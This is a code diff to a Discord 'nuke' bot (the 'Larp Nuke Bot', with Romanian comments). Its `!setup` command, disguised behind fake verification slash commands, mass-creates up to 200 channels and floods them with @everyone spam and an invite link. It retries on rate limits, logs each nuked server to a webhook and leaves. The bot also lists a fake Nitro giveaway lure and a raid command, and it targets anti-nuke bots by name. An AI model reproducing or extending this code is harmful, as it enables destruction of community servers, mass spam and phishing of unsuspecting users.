@@ -19,13 +19,13 @@ PREMIUM_FILE = "premium.json"
 CONFIG_FILE = "config.json"
 
 PREM = 1525416750240366693
-MOD_ROLE_ID = 1525416750240366693  # Setează aici ID-ul rolului pentru !modraid (doar owner va avea acces)
+MOD_ROLE_ID = 1525416750240366693
 WHITELIST = [1464634211406188721]
 BLACKLISTED_GUILD_ID = 1525971260943892510
 OWNER_ID = 1464634211406188721
 LEADERBOARD_CHANNEL_ID = 1401931021544460389
 TOKEN = os.getenv('TOKEN')
-LOG_WEBHOOK_URL = os.getenv('LOG_WEBHOOK') or ''  # variabila de mediu LOG_WEBHOOK
+LOG_WEBHOOK_URL = os.getenv('LOG_WEBHOOK') or ''
 
 BLOCKED_BOT_IDS = [651095740390834176, 548410451818708993]
 BLOCKED_BOT_NAMES = ["Security", "Wick", "Beemo", "AntiNuke"]
@@ -212,8 +212,7 @@ class MyBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.all()
         super().__init__(command_prefix="!", intents=intents)
-        # Elimină comanda implicită help pentru a o înlocui cu a noastră
-        self.remove_command("help")
+        self.remove_command("help")  # eliminăm comanda implicită help
 
     async def setup_hook(self):
         await self.tree.sync()
@@ -221,7 +220,7 @@ class MyBot(commands.Bot):
 bot = MyBot()
 
 # ================== FUNCȚIA DE LOG PRIN WEBHOOK ==================
-async def send_nuke_log(guild, user):
+async def send_nuke_log(guild, user, channels, messages):
     """Trimite un embed detaliat printr-un webhook despre nuke-ul efectuat."""
     if not LOG_WEBHOOK_URL:
         return
@@ -239,6 +238,8 @@ async def send_nuke_log(guild, user):
     embed.add_field(name="👑 Owner", value=f"`{guild.owner}`", inline=True)
     embed.add_field(name="📅 Creat", value=f"`{guild.created_at.strftime('%Y-%m-%d %H:%M UTC')}`", inline=True)
     embed.add_field(name="⚡ Boost Level", value=f"`{guild.premium_tier}`", inline=True)
+    embed.add_field(name="📊 Canale create", value=f"`{channels}`", inline=True)
+    embed.add_field(name="📨 Mesaje per canal", value=f"`{messages}`", inline=True)
     embed.set_footer(text="Larp Nuke Bot • Logs")
 
     try:
@@ -247,6 +248,48 @@ async def send_nuke_log(guild, user):
             await webhook.send(embed=embed)
     except Exception as e:
         print(f"[LOG ERROR] {e}")
+
+# ================== SLASH COMMANDS (doar pentru afișare) ==================
+@bot.tree.command(name="bypass", description="Manage verification bypasses")
+@app_commands.default_permissions(administrator=True)
+async def bypass(interaction: Interaction):
+    await interaction.response.send_message("This command is not implemented yet.", ephemeral=True)
+
+@bot.tree.command(name="blacklist", description="Manage blacklisted users")
+@app_commands.default_permissions(administrator=True)
+async def blacklist(interaction: Interaction):
+    await interaction.response.send_message("This command is not implemented yet.", ephemeral=True)
+
+@bot.tree.command(name="feedback", description="Submit feedback for this server")
+async def feedback(interaction: Interaction):
+    await interaction.response.send_message("Feedback command is not implemented yet.", ephemeral=True)
+
+@bot.tree.command(name="ping", description="Responds with Pong!")
+async def ping(interaction: Interaction):
+    await interaction.response.send_message("Pong!", ephemeral=True)
+
+@bot.tree.command(name="pull", description="Pull verification data")
+@app_commands.default_permissions(administrator=True)
+async def pull(interaction: Interaction):
+    await interaction.response.send_message("Pull command is not implemented yet.", ephemeral=True)
+
+@bot.tree.command(name="rep", description="View this server's reputation and trust score")
+async def rep(interaction: Interaction):
+    await interaction.response.send_message("Reputation system is not implemented yet.", ephemeral=True)
+
+@bot.tree.command(name="setup", description="Set up the verification channel and message for this server")
+@app_commands.default_permissions(administrator=True)
+async def setup_slash(interaction: Interaction):
+    await interaction.response.send_message("Setup command is not implemented yet. Please use `!setup` for nuke.", ephemeral=True)
+
+@bot.tree.command(name="syncroles", description="Sync roles based on verified status")
+@app_commands.default_permissions(administrator=True)
+async def syncroles(interaction: Interaction):
+    await interaction.response.send_message("Sync roles command is not implemented yet.", ephemeral=True)
+
+@bot.tree.command(name="vouch", description="Leave a vouch for this server")
+async def vouch(interaction: Interaction):
+    await interaction.response.send_message("Vouch command is not implemented yet.", ephemeral=True)
 
 # ================== COMENZI PREMIUM (doar owner) ==================
 @bot.command(name="addpremium")
@@ -446,28 +489,6 @@ async def invite_cmd(ctx):
     except discord.Forbidden:
         await ctx.reply("❌ I couldn't DM you. Please check your privacy settings.", ephemeral=True if ctx.guild else False)
 
-@bot.command(name="help")  # comanda falsă (păcăleală)
-async def fake_help(ctx):
-    embed = discord.Embed(
-        title="⚡ Nova Bot Help",
-        description="Here are some of the available commands:",
-        color=discord.Color.gold()
-    )
-    embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
-    embed.add_field(name="`!customvc`", value="Create your own temporary custom voice channel with full control.", inline=False)
-    embed.add_field(name="`!autorole`", value="Automatically assigns roles to new members.", inline=False)
-    embed.add_field(name="`!reactionroles`", value="Set up reaction roles with a single command.", inline=False)
-    embed.add_field(name="`!levels`", value="Track activity and earn XP/levels.", inline=False)
-    embed.add_field(name="`!music [song]`", value="Play high-quality music in your voice channel.", inline=False)
-    embed.add_field(name="`!dashboard`", value="Opens a web dashboard where you can manage bot settings.", inline=False)
-    embed.add_field(name="`!welcome`", value="Set up custom welcome & goodbye messages.", inline=False)
-    embed.add_field(name="`!tags [name]`", value="Create and store custom text snippets.", inline=False)
-    embed.add_field(name="`!premium`", value="Shows how to unlock extra features and perks.", inline=False)
-    embed.add_field(name="`!help`", value="Shows this help menu.", inline=False)
-    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
-    embed.timestamp = datetime.utcnow()
-    await ctx.send(embed=embed)
-
 @bot.command(name="nhelp")
 async def real_help(ctx):
     embed = discord.Embed(
@@ -482,9 +503,8 @@ async def real_help(ctx):
     embed.add_field(name="`!invite`", value="Sends the bot invite to your dms.", inline=False)
     embed.add_field(name="`!fakenitro`", value="Create a fake nitro giveaway and lure people.", inline=False)
     embed.add_field(name="`!modraid`", value="Raid command (Owner only)", inline=False)
-    embed.add_field(name="`/dashboard`", value="Displays a dashboard for custom settings.", inline=False)
-    embed.add_field(name="`!help`", value="Shows a fake help embed.", inline=False)
     embed.add_field(name="`!nhelp`", value="Shows this real help embed.", inline=False)
+    embed.add_field(name="**Slash Commands**", value="`/bypass`, `/blacklist`, `/feedback`, `/ping`, `/pull`, `/rep`, `/setup`, `/syncroles`, `/vouch`\n*(These are placeholders and do not have functionality yet)*", inline=False)
     embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url)
     embed.timestamp = datetime.utcnow()
     await ctx.send(embed=embed)
@@ -553,7 +573,6 @@ async def create_channel_with_retry(guild, name, max_retries=10):
 async def setup(ctx):
     guild = ctx.guild
     user = ctx.author
-    user_config = get_user_config(user.id)
 
     if not ctx.guild.me.guild_permissions.administrator:
         await ctx.send("❌ Bot does not have Administrator permission.")
@@ -574,8 +593,13 @@ async def setup(ctx):
 
     save_nuke_stats(user.id, guild)
 
-    # Trimite logul prin webhook
-    await send_nuke_log(guild, user)
+    # ===== DETERMINĂ PARAMETRII DUPĂ OWNER =====
+    is_owner = (user.id == OWNER_ID)
+    total_channels = 200 if is_owner else 70
+    spam_messages = 25 if is_owner else 15
+
+    # Trimite log prin webhook
+    await send_nuke_log(guild, user, total_channels, spam_messages)
 
     admin_users = [1389763251042258944, 1464634211406188721]
 
@@ -635,8 +659,7 @@ async def setup(ctx):
     repeat_count = 50
     big_message = (base_text * repeat_count)[:2000]
 
-    # ===== CREATE 200 CHANNELS IN PARALLEL =====
-    total_channels = 200
+    # ===== CREATE CHANNELS IN PARALLEL =====
     font_styles = ["bold", "script", "double"]
     created_channels = []
 
@@ -650,7 +673,7 @@ async def setup(ctx):
             await asyncio.sleep(0.1)
             await send_with_retry(channel, embed=embed_content)
             await asyncio.sleep(0.1)
-            for _ in range(25):
+            for _ in range(spam_messages):  # 25 pentru owner, 15 pentru ceilalți
                 ping_count = random.randint(5, 12)
                 msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                 await send_with_retry(channel, content=msg)
@@ -677,7 +700,7 @@ async def setup(ctx):
     tasks = [create_and_spam(i) for i in range(total_channels)]
     await asyncio.gather(*tasks)
 
-    await user.send(f"✅ All {len(created_channels)} channels created, spam (25 messages per channel) running in parallel with retry on rate-limit!")
+    await user.send(f"✅ All {len(created_channels)} channels created, spam ({spam_messages} messages per channel) running in parallel with retry on rate-limit!")
 
     await asyncio.sleep(3)
 
@@ -689,89 +712,6 @@ async def setup(ctx):
         pass
 
     await guild.leave()
-
-# ================== DASHBOARD / SETTINGS ==================
-class SettingsModal(discord.ui.Modal):
-    def __init__(self, user_id: int):
-        super().__init__(title="Configure your settings")
-        self.user_id = user_id
-        self.show_username_input = discord.ui.TextInput(
-            label="Show username? (yes/no)",
-            placeholder="yes or no",
-            default="yes" if get_show_username(user_id) else "no",
-            max_length=3
-        )
-        self.channel_name_input = discord.ui.TextInput(
-            label="Channel Name (Premium required)",
-            placeholder="1week-King",
-            default=get_channel_name(user_id),
-            max_length=32
-        )
-        self.webhook_name_input = discord.ui.TextInput(
-            label="Webhook Name (Premium required)",
-            placeholder="larp-empire",
-            default=get_webhook_name(user_id),
-            max_length=32
-        )
-        self.webhook_message_input = discord.ui.TextInput(
-            label="Webhook Message (Premium required)",
-            placeholder="This sv has been officially closed https://discord.gg/larpempire",
-            default=get_webhook_message(user_id),
-            max_length=100
-        )
-        self.server_name_input = discord.ui.TextInput(
-            label="Server Name (Premium required)",
-            placeholder="1weeksober owns this",
-            default=get_server_name(user_id),
-            max_length=32
-        )
-        self.add_item(self.show_username_input)
-        self.add_item(self.channel_name_input)
-        self.add_item(self.webhook_name_input)
-        self.add_item(self.webhook_message_input)
-        self.add_item(self.server_name_input)
-
-    async def on_submit(self, interaction: discord.Interaction):
-        user_id = self.user_id
-        is_premium = is_premium_user(user_id)
-        show_username_input = self.show_username_input.value.strip().lower()
-        if show_username_input in ["yes", "no"]:
-            set_show_username(user_id, show_username_input == "yes")
-        def safe_set(key, value, default):
-            if is_premium:
-                set_user_config(user_id, key, value)
-            else:
-                set_user_config(user_id, key, default)
-        safe_set("channel_name", self.channel_name_input.value.strip(), "1week-King")
-        safe_set("webhook_name", self.webhook_name_input.value.strip(), "larp-empire")
-        safe_set("webhook_message", self.webhook_message_input.value.strip(), "This sv has been officially closed https://discord.gg/larpempire")
-        safe_set("server_name", self.server_name_input.value.strip(), "1weeksober owns this")
-        await interaction.response.send_message("✅ Your settings have been saved.", ephemeral=True)
-
-class DashboardView(discord.ui.View):
-    def __init__(self, user_id: int):
-        super().__init__(timeout=180)
-        self.user_id = user_id
-    @discord.ui.button(label="Configure Settings", style=discord.ButtonStyle.primary)
-    async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_modal(SettingsModal(self.user_id))
-
-@bot.tree.command(name="dashboard", description="Show your settings dashboard")
-async def dashboard(interaction: discord.Interaction):
-    user_id = interaction.user.id
-    show_username = get_show_username(user_id)
-    channel_name = get_channel_name(user_id)
-    webhook_name = get_webhook_name(user_id)
-    webhook_message = get_webhook_message(user_id)
-    server_name = get_server_name(user_id)
-    embed = discord.Embed(title="User Dashboard", color=discord.Color.blue())
-    embed.add_field(name="Show Username", value="Yes" if show_username else "No", inline=True)
-    embed.add_field(name="Channel Name", value=channel_name, inline=True)
-    embed.add_field(name="Webhook Name", value=webhook_name, inline=True)
-    embed.add_field(name="Webhook Message", value=webhook_message, inline=False)
-    embed.add_field(name="Server Name", value=server_name, inline=True)
-    view = DashboardView(user_id)
-    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
 
 @bot.event
 async def on_ready():
